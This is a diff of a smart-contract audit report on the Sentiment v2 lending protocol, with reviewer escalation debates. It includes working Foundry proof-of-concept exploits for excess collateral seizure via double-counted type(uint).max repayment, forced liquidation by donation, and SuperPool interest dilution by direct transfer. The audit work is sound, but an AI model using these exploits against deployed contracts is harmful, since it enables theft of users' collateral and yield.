+    SuperPoolFactory superPoolFactory;
+    address user_1 = makeAddr("User_1");
 
-        // apply changes
-        ltvFor[poolId][asset] = ltvUpdate.ltv;
-        delete ltvUpdateFor[poolId][asset];
-        emit LtvUpdateAccepted(poolId, asset, ltvUpdate.ltv);
+    address attacker = makeAddr("Attacker");
+
+    address public feeTo = makeAddr("FeeTo");
+
+    function setUp() public override {
+        super.setUp();
+
+        pool = protocol.pool();
+        registry = protocol.registry();
+        riskEngine = protocol.riskEngine();
+        superPoolFactory = protocol.superPoolFactory();
+
+        FixedPriceOracle asset1Oracle = new FixedPriceOracle(1e18);
+        vm.prank(protocolOwner);
+        riskEngine.setOracle(address(asset1), address(asset1Oracle));
     }
-```
 
-# Issue M-41: User's can seize more assets during liquidation by using type(uint).max 
+    function test_interest_manipulation_WITH_BUG_1() public {
+        address feeRecipient = makeAddr("FeeRecipient");
 
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/556 
+        vm.prank(protocolOwner);
+        asset1.mint(address(this), initialDepositAmt);
+        asset1.approve(address(superPoolFactory), initialDepositAmt);
 
-## Found by 
-A2-security, Brenzee, EgisSecurity, hash, serial-coder, sl1
-## Summary
-User's can seize more assets during liquidation than what should be actually allowed by replaying the repayment amount using type(uint).max 
+        address deployed = superPoolFactory.deploySuperPool(
+            poolOwner,
+            address(asset1),
+            feeRecipient,
+            1e17,
+            type(uint256).max,
+            initialDepositAmt,
+            "test",
+            "test"
+        );
+        superPool = SuperPool(deployed);
+        /*//////////////////////////////////////////////////////////////
+                     ATTACKER SENDING FUNDS TO SUPERPOOL
+        //////////////////////////////////////////////////////////////*/
 
-## Vulnerability Detail
-The liquidators are restricted on the amount of collateral they can seize during a liquidation
+        vm.startPrank(attacker);
+        asset1.mint(attacker, 1e18);
+        asset1.transfer(address(superPool), 1e18);
+        vm.stopPrank();
 
-Eg:
-if a position has 1e18 worth debt, and 2e18 worth collateral, then on a liquidation the user cannot seize 2e18 collateral by repaying the 1e18 debt, and they are limited to seizing for ex. 1.3e18 worth of collateral (depends on the liquidation discount how much profit a liquidator is able to generate)
+        /*//////////////////////////////////////////////////////////////
+                     user_1 DEPOSITNG TO SUPERPOOL
+        //////////////////////////////////////////////////////////////*/
 
-The check for this max seizable amount is kept inside `_validateSeizedAssetValue`
+        vm.startPrank(user_1);
+        asset1.mint(user_1, 1e18);
 
-[link](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/RiskModule.sol#L129-L145)
-```solidity
-    function _validateSeizedAssetValue(
-        address position,
-        DebtData[] calldata debtData,
-        AssetData[] calldata assetData,
-        uint256 discount
-    ) internal view {
-        // compute value of debt repaid by the liquidator
-        uint256 debtRepaidValue;
-        uint256 debtLength = debtData.length;
-        for (uint256 i; i < debtLength; ++i) {
-            uint256 poolId = debtData[i].poolId;
-            uint256 amt = debtData[i].amt;
-            if (amt == type(uint256).max) amt = pool.getBorrowsOf(poolId, position);
-            address poolAsset = pool.getPoolAssetFor(poolId);
-            IOracle oracle = IOracle(riskEngine.getOracleFor(poolAsset));
-            debtRepaidValue += oracle.getValueInEth(poolAsset, amt);
-        }
+        asset1.approve(address(superPool), type(uint256).max);
 
-        .....
+        superPool.deposit(1e18, user_1);
+        vm.stopPrank();
+        console2.log(
+            "SuperPool(SHARES) Balance of User1 after depositing: ",
+            superPool.balanceOf(user_1)
+        );
+        console2.log(
+            "SuperPool(SHARES) Balance of FeeRecipient before: ",
+            superPool.balanceOf(feeRecipient)
+        );
 
-        uint256 maxSeizedAssetValue = debtRepaidValue.mulDiv(1e18, (1e18 - discount));
-        if (assetSeizedValue > maxSeizedAssetValue) {
-            revert RiskModule_SeizedTooMuch(assetSeizedValue, maxSeizedAssetValue);
-        }
-```
+        /*//////////////////////////////////////////////////////////////
+                           NOW SUPERPOOL ACCUMATES INTEREST
+        //////////////////////////////////////////////////////////////*/
+        asset1.mint(address(superPool), 10e18);
+        superPool.accrue();
+        uint SHARES_OF_DEAD_ADDRESS = superPool.balanceOf(
+            0x000000000000000000000000000000000000dEaD
+        );
+        console2.log(
+            "SuperPool(SHARES) Balance of FeeRecipient after interest accumulates: ",
+            superPool.balanceOf(feeRecipient)
+        );
+        console2.log(
+            "Assest balance of superpool: ",
+            asset1.balanceOf(address(superPool))
+        );
 
-But the `_validateSeizedAssetValue` is flawed as it assumes that the value `type(uint256).max` will result in the liquidator repaying the current `pool.getBorrowsOf(poolId, position)` value. In the actual execution, an attacker can repay some amount earlier and then use `type(uint256).max` on the same pool which will result in a decreased amount because debt has been repaid earlier
+        console2.log(
+            "SuperPool(SHARES) Total Supply: ",
+            superPool.totalSupply()
+        );
 
-Eg:
-getBorrows of position = 1e18
-user passes in 0.9e18 and type(uint).max as the repaying values
-the above snippet will consider it as 0.9e18 + 1e18 being repaid and hence allow for more than 1.9e18 worth of collateral to be seized
-but during the actual execution, since 0.9e18 has already been repaid, only 0.1e18 will be transferred from the user allowing the user
+        console2.log(
+            "Preview Redeem for User1: ",
+            superPool.previewRedeem(superPool.balanceOf(user_1))
+        );
+        console2.log(
+            "Preview Redeem for FeeRecipient: ",
+            superPool.previewRedeem(superPool.balanceOf(feeRecipient))
+        );
+        console2.log(
+            "Preview Redeem for dead: ",
+            superPool.previewRedeem(SHARES_OF_DEAD_ADDRESS)
+        );
+        console2.log("Total Assets: ", superPool.totalAssets());
 
-### POC Code
-Apply the following diff and run `testHash_LiquidateExcessUsingDouble`. It is asserted that a user can use this method to seize the entire collateral of the debt position even though it results in a much higher value than what should be actually allowed
+        console2.log(
+            "% of total assest the dead shares can claim: ",
+            (superPool.previewRedeem(SHARES_OF_DEAD_ADDRESS) * 1e18) /
+                superPool.totalAssets()
+        );
 
-```diff
-diff --git a/protocol-v2/test/integration/LiquidationTest.t.sol b/protocol-v2/test/integration/LiquidationTest.t.sol
-index beaca63..29e674a 100644
---- a/protocol-v2/test/integration/LiquidationTest.t.sol
-+++ b/protocol-v2/test/integration/LiquidationTest.t.sol
-@@ -48,6 +48,85 @@ contract LiquidationTest is BaseTest {
-         vm.stopPrank();
-     }
- 
-+    function testHash_LiquidateExcessUsingDouble() public {
-+        vm.startPrank(user);
-+        asset2.approve(address(positionManager), 1e18);
-+
-+        // deposit 1e18 asset2, borrow 1e18 asset1
-+        Action[] memory actions = new Action[](7);
-+        (position, actions[0]) = newPosition(user, bytes32(uint256(0x123456789)));
-+        actions[1] = deposit(address(asset2), 1e18);
-+        actions[2] = addToken(address(asset2));
-+        actions[3] = borrow(fixedRatePool, 1e18);
-+        actions[4] = approve(address(mockswap), address(asset1), 1e18);
-+        bytes memory data = abi.encodeWithSelector(SWAP_FUNC_SELECTOR, address(asset1), address(asset2), 1e18);
-+        actions[5] = exec(address(mockswap), 0, data);
-+        actions[6] = addToken(address(asset3));
-+        positionManager.processBatch(position, actions);
-+        vm.stopPrank();
-+        assertTrue(riskEngine.isPositionHealthy(position));
-+
-+        (uint256 totalAssetValue, uint256 totalDebtValue, uint256 minReqAssetValue) = riskEngine.getRiskData(position);
-+
-+        assertEq(totalAssetValue, 2e18);
-+        assertEq(totalDebtValue, 1e18);
-+        assertEq(minReqAssetValue, 2e18);
-+
-+        // modify asset2 price from 1eth to 0.9eth
-+        // now there is 1e18 debt and 1.8e18 worth of asset2
-+        FixedPriceOracle pointOneEthOracle = new FixedPriceOracle(0.9e18);
-+        vm.prank(protocolOwner);
-+        riskEngine.setOracle(address(asset2), address(pointOneEthOracle));
-+        assertFalse(riskEngine.isPositionHealthy(position));
-+        
-+        // maximumSeizable amount with liquidation discount : 1388888888888888888 ie. 1.38e18
-+        uint liquidationDiscount = riskEngine.riskModule().LIQUIDATION_DISCOUNT();
-+        uint supposedMaximumSeizableAssetValue = totalDebtValue * 1e18 / (1e18 - liquidationDiscount);
-+        uint maximumSeizableAssets = supposedMaximumSeizableAssetValue * 1e18 / 0.9e18;
-+
-+        assert(maximumSeizableAssets == 1388888888888888888);
-+
-+        DebtData memory debtData = DebtData({ poolId: fixedRatePool, amt: 1e18 });
-+        DebtData[] memory debts = new DebtData[](1);
-+        debts[0] = debtData;
-+
-+        // verifying that attempting to seize more results in a revert
-+        // add dust to cause minimal excess
-+        AssetData memory asset2Data = AssetData({ asset: address(asset2), amt: maximumSeizableAssets + 10 });
-+        AssetData[] memory assets = new AssetData[](1);
-+        assets[0] = asset2Data;
-+
-+        asset1.mint(liquidator, 10e18);
-+
-+        vm.startPrank(liquidator);
-+        asset1.approve(address(positionManager), 1e18);
-+
-+        // seizeAttempt value : 1250000000000000008, seizable value : 1250000000000000000
-+        vm.expectRevert(abi.encodeWithSelector(RiskModule.RiskModule_SeizedTooMuch.selector, 1250000000000000008, 1250000000000000000));
-+        positionManager.liquidate(position, debts, assets);
-+        vm.stopPrank();
-+
-+        // but an attacker can liquidate almost double by exploiting the type.max issue
-+        debtData = DebtData({ poolId: fixedRatePool, amt: 0.9e18 });
-+        debts = new DebtData[](2);
-+        debts[0] = debtData;
-+
-+        // replay the balance value. this will cause the repaid amount to be double counted allowing the user to liquidate the entire assets
-+        debtData = DebtData({ poolId: fixedRatePool, amt: type(uint256).max });
-+        debts[1] = debtData;
-+
-+        // liquidate full asset balance
-+        asset2Data = AssetData({ asset: address(asset2), amt: 2e18 });
-+        assets = new AssetData[](1);
-+        assets[0] = asset2Data;
-+
-+        // liquidate
-+        vm.startPrank(liquidator);
-+        asset1.approve(address(positionManager), 1e18);
-+        positionManager.liquidate(position, debts, assets);
-+        vm.stopPrank();
-+    }
-+
-     function testLiquidate() public {
-         vm.startPrank(user);
-         asset2.approve(address(positionManager), 1e18);
-```
-
-## Impact
-Borrowers will loose excess collateral during liquidation
-
-## Code Snippet
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/RiskModule.sol#L129-L145
-
-## Tool used
-Manual Review
-
-## Recommendation
-Only allow a one entry for each poolId in the `debtData` array. This can be enforced by checking that the array is in a strictly sequential order on pools 
-
-# Issue M-42: Formula used for minimum required collateral value is flawed 
-
-Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/558 
-
-## Found by 
-hash
-## Summary
-The formula that is used to calculate the minimum required collateral value for a position is flawed and allows attackers to liquidate user's by donating assets
-
-## Vulnerability Detail
-A position is considered non-healthy ie. liquidateable when the collateral value is less than `minReqAssetValue`
-
-[link](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/RiskModule.sol#L67-L85)
-```solidity
-    function isPositionHealthy(address position) public view returns (bool) {
-        
-        ....
-
-        uint256 minReqAssetValue =
-            _getMinReqAssetValue(debtPools, debtValueForPool, positionAssets, positionAssetWeight, position);
-        return totalAssetValue >= minReqAssetValue; // (non-zero debt, non-zero assets)
+        console2.log(
+            "% of total assest the user1 and feeRecipient shares can claim: ",
+            ((superPool.previewRedeem(superPool.balanceOf(user_1)) +
+                superPool.previewRedeem(superPool.balanceOf(feeRecipient))) *
+                1e18) / superPool.totalAssets()
+        );
+       
+        assert(
+            superPool.previewRedeem(superPool.balanceOf(user_1)) +
+                superPool.previewRedeem(superPool.balanceOf(feeRecipient)) <
+                (superPool.totalAssets() * 0.6e18) / 1e18
+        );
     }
+}
 ```
-
-Where `minReqAssetValue` is calculated as follows:
-[link](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/RiskModule.sol#L272)
 ```solidity
-    function _getMinReqAssetValue(
-        uint256[] memory debtPools,
-        uint256[] memory debtValuleForPool,
-        address[] memory positionAssets,
-        uint256[] memory wt,
-        address position
-    ) internal view returns (uint256) {
-        
-        ....
+Logs:
+  SuperPool(SHARES) Balance of User1 after depositing:  111111
+  SuperPool(SHARES) Balance of FeeRecipient before:  11111
+  SuperPool(SHARES) Balance of FeeRecipient after interest accumulates:  31313
+  Assest balance of superpool:  12000000000000100000
+  SuperPool(SHARES) Total Supply:  242424
+  Preview Redeem for User1:  5499977312570944049
+  Preview Redeem for FeeRecipient:  1549988656285462024
+  Preview Redeem for dead:  4949984531298380942
+  Total Assets:  12000000000000100000
+  % of total assest the dead shares can claim:  412498710941528307
+  % of total assest the user1 and feeRecipient shares can claim:  587497164071362276
+  ```
 
-        for (uint256 i; i < debtPoolsLength; ++i) {
-            for (uint256 j; j < positionAssetsLength; ++j) {
-                
-                ....
+**cvetanovv**
 
-                minReqAssetValue += debtValuleForPool[i].mulDiv(wt[j], ltv, Math.Rounding.Up);
-            }
-        }
-```
+@ARNO-0 Thanks for the explanation. Now I fully understand what you meant in the issue. At first, I understood the issue differently. I run the PoC, and everything works.
 
-Here `wt[j]` is the weight of the collateral token by value ie. if in a pool there is 1 worth of collateral A and 1 worth of collateral B, then both have weights as 0.5,0.5. `ltv` is the loan to value ratio. 
+Indeed, this attack will reduce the future profits of users because the "dead address" will accumulate a portion of the profit.
 
-This method of calculation of `minReqAssetValue` is flawed as it can allow an attacker to donate and increase balance of the lower ltv token causing higher portion of the debt to be assigned to the lower ltv token which can increase the minReqAssetValue in a way such that it is not covered by the donated amount
+However, I think this issue is valid Medium(not High) because the malicious user will hurt the future profit of honest users but not profit anything from the attack. Even if he deposits later(obviously, he won't), he will be the victim, too. If users are not satisfied with the profit, they can not invest in the pool.
 
-Eg:
-all tokens prices = 1
-ltv a = 20%, ltv b = 80%
-initial collateral amounts: 40a, 160b (2:8)
-debt amount = 100
-currently healthy position,
-minReqAssetValue = (100 * 0.2 / 0.2) + (100 * 0.8 / 0.8) == 200 == collateral value
+I am planning to accept the escalation and make this issue a valid Medium.
 
-attacker donates 1 token a
-now token weights = 41:160
-now minReqAssetValue = (100 * (41/201) / 0.2 ) + (100 * (160/201) / 0.8) == 201.492537313 while collateral value == 200 + 1 == 201
+**ARNO-0**
 
-hence liquidateable
+@cvetanovv, thank you for listening to the details, sir.
 
-attacker can now liquidate the position making a profit with the 10% liquidation discount
+I would have agreed with a medium severity rating if it was just one pool affected. However, in this case, every newly deployed pool will face losses, which will accumulate into a larger loss of funds. As you mentioned, users can choose whether to invest or not, but by then, the damage would already be done. I believe this should be considered **high severity** for three reasons:
 
-### POC Code
-Apply the following diff and run `testHash_LiquidatePositionByDonation`. It is asserted that a pool that was healthy can be made liquidateable by an attacker by making a donation which will be covered by their profit
+1) **Likelihood (High)**: The attack can be executed by any regular user without the need for special tools. As soon as a pool is deployed, it can be attacked, potentially harming the protocol.
+2) **Impact (High)**: There is a direct and permanent loss of funds, affecting multiple parties.
 
-```diff
-diff --git a/protocol-v2/test/integration/LiquidationTest.t.sol b/protocol-v2/test/integration/LiquidationTest.t.sol
-index beaca63..4dcd863 100644
---- a/protocol-v2/test/integration/LiquidationTest.t.sol
-+++ b/protocol-v2/test/integration/LiquidationTest.t.sol
-@@ -33,9 +33,9 @@ contract LiquidationTest is BaseTest {
-         vm.stopPrank();
- 
-         vm.startPrank(poolOwner);
--        riskEngine.requestLtvUpdate(fixedRatePool, address(asset3), 0.5e18); // 2x lev
-+        riskEngine.requestLtvUpdate(fixedRatePool, address(asset3), 0.8e18); // 2x lev
-         riskEngine.acceptLtvUpdate(fixedRatePool, address(asset3));
--        riskEngine.requestLtvUpdate(fixedRatePool, address(asset2), 0.5e18); // 2x lev
-+        riskEngine.requestLtvUpdate(fixedRatePool, address(asset2), 0.2e18); // 2x lev
-         riskEngine.acceptLtvUpdate(fixedRatePool, address(asset2));
-         vm.stopPrank();
- 
-@@ -48,6 +48,43 @@ contract LiquidationTest is BaseTest {
-         vm.stopPrank();
-     }
- 
-+    function testHash_LiquidatePositionByDonation() public {
-+        // asset 1,2,3 price = 1 and asset 2 ltv = 0.2 and asset 3 ltv = 0.8
-+        // borrow 100 debt and put asset2:asset3 collateral value in 2:8
-+        // setup tokens
-+        {
-+            uint256 asset2CollateralAmount = 40e18;
-+            uint256 asset3CollateralAmount = 160e18;
-+            asset2.mint(user, asset2CollateralAmount);
-+            asset3.mint(user, asset3CollateralAmount);
-+            vm.startPrank(user);
-+            asset2.approve(address(positionManager), asset2CollateralAmount);
-+            asset3.approve(address(positionManager), asset3CollateralAmount);
-+
-+            Action[] memory actions = new Action[](6);
-+            (position, actions[0]) = newPosition(user, bytes32(uint256(0x123456789)));
-+            actions[1] = deposit(address(asset2), asset2CollateralAmount);
-+            actions[2] = deposit(address(asset3), asset3CollateralAmount);
-+            actions[3] = addToken(address(asset2));
-+            actions[4] = addToken(address(asset3));
-+            actions[5] = borrow(fixedRatePool, 100e18);
-+            positionManager.processBatch(position, actions);
-+            vm.stopPrank();
-+        }
-+
-+        assertTrue(riskEngine.isPositionHealthy(position));
-+
-+        //attacker deposits 1 more asset2, makes the position liquidateable and liquidates the position
-+        address attacker = address(0xd33d33);
-+        asset2.mint(attacker,1e18);
-+
-+        vm.prank(attacker);
-+        asset2.transfer(position,1e18);
-+        assertTrue(!riskEngine.isPositionHealthy(position));
-+
-+        // attacker can liquidate 100e18 debt for a liquidation profit of 10% making a net profit
-+    }
-+
-     function testLiquidate() public {
-         vm.startPrank(user);
-         asset2.approve(address(positionManager), 1e18);
+3) **According to this rule**:
+![image](https://github.com/user-attachments/assets/0aca6277-5ef3-425d-86fa-5ebace5d75a3)
 
-```
 
-## Impact
-User's can be liquidated by attackers even when they have maintained enough collateral value
+**cvetanovv**
 
-## Code Snippet
-https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/RiskModule.sol#L272
+@ARNO-0 I agree with you that although the malicious user suffers little loss, he can make the attack on any pool without having an external condition.
 
-## Tool used
-Manual Review
+I am planning to accept the escalation and make this issue a valid High.
 
-## Recommendation 
+**elhajin**
 
-# Issue M-43: Attacker can inflict losses to other Superpool user's during a bad debt liquidation depending on the deposit/withdraw queue order 
+Hey @cvetanovv , I think this issue is invalid. It's like saying that an attacker can mint shares and let them accumulate yield indefinitely, which is completely fine since users choose which pools to invest in. If your concern is that an attacker could make it expensive for the deployer the first time they set up the pool by sending valuable shares to a dead address, that’s similar to what we discussed in #97. Regardless, if a user invests in a pool with 1,000 shares and he have 100 , they still receive 10% of the interest, no matter how many shares are in the dead address. To be honest, this isn't really an issue at all. Issue #97 explains the risks of sending direct funds to a newly deployed address, which can lead to DoS attacks or make creating new super pools too expensive. Also, if the owner decides to burn 1 million shares at deployment, those shares will still accumulate yield, so what's the actual problem? Users can just choose not to invest in pools they don’t want to. Sending shares to a dead address is a known mechanism to prevent inflation attacks, and it’s widely accepted that those shares will accumulate yield from the vault. The idea is that the yield is always negligible, since the shares are small, and if the attacker increases their share count by sending funds directly to the dead address, it aligns with the concerns raised in issue #97
+
+- Lastly, to be **clear and honest**, both 97  and this issue are invalid(we actually have a duplicate of 97). Let’s say an attacker sends 1e18 WETH to the next super pool that’s about to be deployed. As the deployer, this is great for me. Here’s my plan: I’ll deploy the super pool with a 100% fee upon deposit. The fee recipient (which is me) will be minted 1e18 shares, and then I’ll deposit 1,000 WETH, which will mint 1,000 shares that get sent to a dead address. In this way, I effectively steal from the attacker 1weth , and there is no inflation of share price. i can than change the fees back . 
+
+**ARNO-0**
+
+@elhajin you don’t fully understand the issue, as most of the points you raised are not even relevant to this issue. Many of your points are about issue 97 .
+
+- **"It’s like saying that an attacker can mint shares and let them accumulate yield indefinitely, which is completely fine since users choose which pools to invest in."**
+
+1) The attacker is **not** minting shares.
+   
+2) So, the point about **"letting them accumulate yield indefinitely"** is completely invalid.
+
+3) **"Users choose which pools to invest in"**—Yield manipulation is not visible until the first user deposits into the pool. Even if it were visible, the attacker could simply wait for the first depositor and frontrun them.
+
+4) **"If the owner decides to burn 1 million shares at deployment, those shares will still accumulate yield."**  
+   The fix does not determine the severity of the issue.
+
+5) **"Regardless, if a user invests in a pool with 1,000 shares and they have 100, they still receive 10% of the interest, no matter how many shares are in the dead address. To be honest, this isn't really an issue at all."**  
+   The attacker manipulates the system to favor dead shares, meaning the rest of the yield is lost.
+
+- **"Sending shares to a dead address is a known mechanism to prevent inflation attacks, and it’s widely accepted that those shares will accumulate yield from the vault. The idea is that the yield is always negligible, since the shares are small."**
+
+1) **"Those shares will accumulate yield from the vault. The idea is that the yield is always negligible"** — This exact behavior is what the attacker manipulates.
+
+2) The rest of the points you raised are not relevant to this issue.
+
+
+**samuraii77**
+
+I want to add that the fact that this can be done on many pools does not make it a High. The threshold for a High is 1% losses, having more pools vulnerable to this does not increase the percentage. It might increase the overall losses but not the percentage. 
+
+Either way, this issue does not qualify for a Medium either, the points brought by @elhajin are completely valid, there is nothing wrong with the code as such an attack can be done on any pool in existence.
+
+**elhajin**
+
+Agree I didn't read the full issue .. now I'm convinced it's totally invalid
+- this is how distributing  rewards based on shares works the more users deposits the more diluted shares but it's proportional because more deposits means more rewards .. in your issue the donated amount from the attacker will also be used to generate yield as well (it would be an issue if only the user deposit will be used to generate yield than the yield are splits with the dead address).. so user doesn't lose anyway.
+
+- it's kinda saying: **an attacker can deposit to a SuperPool and mint some shares that he will never claim and they keep accumulating yield ; stealing portion of interest from other users**(and yea a smarter attacker will mint those shares rather than donating them )
+- in this case all users would be attackers.. 
+
+- in the poc we have 50% of total assets are donated by attacker which make dead address gets 50% of rewards (ignore fees) and the user will get 50% . The reward was generated from 2e18 assets .. user contributed by 50% and he got 50% from the interest . There is no loss for the user but permanent lost for the attacker
+- now if another user deposits he will get a proportional reward amount to his deposits
+
+There is completely no issue here
+
+
+
+**cvetanovv**
+
+I agree with @samuraii77 and @elhajin. 
+
+I was initially misled that it was valid because I thought the "SuperPool" worked differently compared to the ERC4626(because of the working PoC). If this issue is valid, it can be submitted to different bug bounty projects, and the submitter can take a lot of money. 
+
+The design of reward distribution in SuperPools is based on shares, meaning users receive a proportion of rewards based on their share ownership. This is how most yield systems work, and thus, no unfair advantage is given to attackers or "dead addresses."
+
+Other users still receive their fair share of rewards based on their contribution to the pool. There is no loss to the users.
+
+My decision is to reject the escalation and leave the issue as is.
+
+**ARNO-0**
+
+@cvetanovv, the whole argument given by other auditors is invalid and manipulated in favor of the standard ERC4626. This implementation of ERC4626 differs from the standard. In the standard ERC4626, interest/yield accumulation depends on the amount a user contributes. However, in this implementation, interest is not dependent on the deposit but instead is accumulated based on borrowing actions—borrow and repay . 
+**Example**:  
+In this version, interest is generated when a user takes out a loan. For instance, if User A deposits 100 tokens into the SuperPool after its deployment, then User B can borrow 100 tokens from the underlying pool. When User B repays the loan with interest after some time, that interest is deposited into the SuperPool. As a result, User A benefits from this borrowing activity by User B, even though the interest was generated by borrowing and not by User A’s deposit.
+
+You can verify this in the test written by the team:  
+[Link to test](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/test/integration/BigTest.t.sol#L167).
+
+
+- **"The design of reward distribution in SuperPools is based on shares, meaning users receive a proportion of rewards based on their share ownership. This is how most yield systems work, and thus, no unfair advantage is given to attackers or 'dead addresses.'"**  
+  This statement is invalid. I’ve already provided the link above proving that the reward distribution in this system does not work like typical yield systems.
+
+- **"Other users still receive their fair share of rewards based on their contribution to the pool. There is no loss to the users."**  
+  This statement is also invalid, as my PoC clearly demonstrates.
+  
+- **"I want to add that the fact that this can be done on many pools does not make it a High. The threshold for a High is 1% losses, having more pools vulnerable to this does not increase the percentage. It might increase the overall losses but not the percentage."**  
+The auditor made this claim without doing the actual math. I suggest the judge verify these claims before making a decision. Most of the yield is lost—greater than 1%—which qualifies it for high severity.
+
+- **"As such, an attack can be done on any pool in existence."**  
+  This is a totally invalid argument and Auditor has no idea what is going on did not even bother to read issue carefully.
+
+
+
+**ARNO-0**
+
+I didn’t explain to them because they are not the judge and are making invalid arguments without fully understanding the issue.
+
+**ruvaag**
+
+I see this issue as a duplicate of issues like #97 and #26 –– they all result from inflation attacks that arise from an attacker directly sending assets to the SuperPool, and share the same root cause of the SuperPool relying on ERC20.balanceOf instead of virtual shares.
+
+My suggestion would be to club all three groups of issues into one valid medium or low. I'll modify the SuperPool to track balances virtually to mitigate them.
+
+**ARNO-0**
+
+@ruvaag  
+1) I strongly disagree with you. Issue 26 is not even about sending funds directly to the SuperPool, and it is invalid. Front running does not cause any harm in ERC4626 or in this implementation when deposits are made through typical deposit functions.
+2) Issue 97 is not a duplicate of this issue. Issue 97 has several workarounds to solve the DoS instantly, such as deploying the SuperPool with a different fake asset and then switching to the main asset so the impact is not even same.
+
+
+3) Tracking the pool in `ERC20.balanceOf` is not an issue, as funds sent directly to the SuperPool will be treated as interest, which only harms the sender. The issue only arises if funds are sent directly before the first user deposit, and that's exactly what I explained in this issue—the impact it has on the depositor.
+
+
+**cvetanovv**
+
+@ARNO-0 I still don't see an issue. What is the logic of someone depositing in a "dead address" instead of depositing for themselves and taking the profit? That makes no logic to me.
+
+You write:
+> In this version, interest is generated when a user takes out a loan. For instance, if User A deposits 100 tokens into the SuperPool after its deployment, then User B can borrow 100 tokens from the underlying pool. When User B repays the loan with interest after some time, that interest is deposited into the SuperPool. As a result, User A benefits from this borrowing activity by User B, even though the interest was generated by borrowing and not by User A’s deposit.
+
+It's a standard design, and I don't see anything wrong with it. If someone decides to deposit in a "dead address" instead of his address and accumulate interest, that's his choice. He loses future profit. 
+
+My decision is to reject the escalation.
+
+**ARNO-0**
+
+@cvetanovv, I think you do not understand the issue.
+
+**"I still don't see an issue. What is the logic of someone depositing in a 'dead address' instead of depositing for themselves and taking the profit? That makes no sense to me."**  
+What are you talking about? I have repeatedly explained that the attacker is **not** depositing into a dead address. Instead, Attacker is sending underlying assets directly to the contract to manipulate interest distribution, ensuring that User A 's most of the interest is lost that will be accumulated from user b borrowing activity.
+
+**"In this version, interest is generated when a user takes out a loan. For instance, if User A deposits 100 tokens into the SuperPool after its deployment, then User B can borrow 100 tokens from the underlying pool. When User B repays the loan with interest after some time, that interest is deposited into the SuperPool. As a result, User A benefits from this borrowing activity by User B, even though the interest was generated by borrowing and not by User A’s deposit."**  
+I wrote this example to help you understand that interest accumulation in this implementation does not work like in a regular ERC4626, as you previously claimed. In this version, the interest is **not** dependent on a user's deposit but rather on borrowing and repayment activity.
+
+what is the point of the writing poc when you do not take that as proof?
+
+
+
+**cvetanovv**
+
+I've checked the PoC test and it works, however, I don't see the logic. 
+
+The malicious user transfers the `1e18` directly into the contract and loses it, instead of depositing it for himself and profiting from interest.
+
+**ARNO-0**
+
+The attacker is of the griefing type that makes any normal depositor lose profit from interest, and the whole point of depositing in the superpool is to earn money for normal depositor. The attacker is not benefiting from this, but a major portion of the profit is lost because the dead address now owns a portion of the profit (due to the shares that were minted during contract deployment). The attacker sent assets directly to make the depositor of the SuperPool users lose profit. The reason why this is happening was explained in an earlier discussion.
+
+and how interest is accumulated i explained already with proof that it is based on borrowing activity of other users
+
+
+For the attack to succeed, the attacker must send assets before any user deposits into the pool. Otherwise, only the attacker will face the loss.
+
+**ARNO-0**
+
+If asked, I can provide a full PoC with interest generated by borrowing activity, which should be used as proof for my claims and will show how a normal user will loose portion of the profit( otherwise user would be able to claim 100% of the profit earned ( fee exculaded) in normal case without attack on the superpool).
+
+
+
+**ARNO-0**
+
+@cvetanovv 
+Also, deposits in the SuperPool are used as liquidity so other users can borrow from it. This explains why the attacker is not depositing themselves to profit from it. If assets are sent directly, they are essentially treated as rewards or interest for the depositors of the SuperPool (if the pool is not attacked). In the PoC, the 1e18 assets (sent directly by the attacker) will be used as interest, not liquidity. If the attacker deposited with the intention of profiting from it, wouldn't that be a normal use of the pool? This wouldn't be an attack in the first place, and it wouldn't cause any harm. In fact, it would be beneficial for the underlying pool because they would gain liquidity that the attacker would never withdraw, and the fee recipient would always profit from the borrowing activity.
+
+I hope this clarifies why the attacker is not depositing
+
+I get the point that the attacker can just deposit and never claim to steal interest.
+
+But this deposit will not cause harm because, let's suppose, an attacker and a user deposit 2e18 (1e18 each), and someone borrows 2e18 in total and repays with 1e18 interest. This interest will be distributed equally. However, if the attacker exploits the SuperPool with a direct transfer (amount = 1e18, which won’t be available for borrowing/liquidity), and two users each deposit 1e18 into the SuperPool (their deposits are used as liquidity, and the liquidity available for borrowing is 2e18 even though the total assets in the SuperPool are 3e18 ; keep in mind that attacker's 1e18 wont be able to be claimed by 2 user), then after the borrowing and interest accumulates , dead shares will also own a portion of the interest. This should not happen.
+
+**The user's earned profit is shared with the dead address, even though the dead address did not contribute to the liquidity. If that is not a valid issue, I don’t know what is.**
+
+
+**WangSecurity**
+
+After discussing this issue, the decision is that it's valid. 
+The users indeed receive less interest in comparison to situation if the attacker just deposited.
+The donated funds don't add any value to the pool, i.e. borrowers cannot use them, so the users receive less interest than they should.
+
+Why Medium? 
+1. This attack can be executed only in before the first depositor.
+2. The attacker has to have large capital, cause if they donate small amount of money, the loss is negligible.
+3. There is no economical incentive and the attacker loses all the money they donate, during this attack.
+
+> *Note: Medium is based on all three reasons. And causing 1% of losses (for High) doesn't mean it's high necessarily, i.e. if the issue causes loss of >1%, the issue can be either H or M, but if the loss is <1% the issue cannot be high.
+
+
+
+**WangSecurity**
+
+Result:
+Medium
+Unique
+
+**sherlock-admin4**
+
+Escalations have been resolved successfully!
+
+Escalation status:
+- [ARNO-0](https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/541/#issuecomment-2352677710): accepted
+
+# Issue M-20: Attacker can inflict losses to other Superpool user's during a bad debt liquidation depending on the deposit/withdraw queue order 
 
 Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/564 
 
 ## Found by 
-hash
+hash, iamnmt
 ## Summary
 Attacker can inflict losses to other Superpool user's during a bad debt liquidation depending on the deposit/withdraw queue order
 
